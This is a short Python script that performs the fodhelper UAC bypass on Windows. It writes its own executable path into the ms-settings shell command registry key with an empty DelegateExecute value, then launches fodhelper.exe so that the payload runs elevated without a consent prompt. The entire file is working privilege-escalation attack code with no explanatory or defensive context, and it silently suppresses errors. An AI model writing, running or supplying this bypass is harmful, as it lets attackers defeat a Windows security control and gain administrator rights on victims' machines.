import os
import sys
import winreg
import subprocess

def add_uac_bypass_registry(payload_path):
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell\Open\command")
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, payload_path)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        return True
    except:
        return False

def execute_fodhelper():
    try:
        subprocess.Popen(["fodhelper.exe"], shell=False)
    except:
        pass

if __name__ == "__main__":
    if os.name != "nt":
        sys.exit(1)
    payload_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else sys.argv[0])
    if add_uac_bypass_registry(payload_path):
        execute_fodhelper()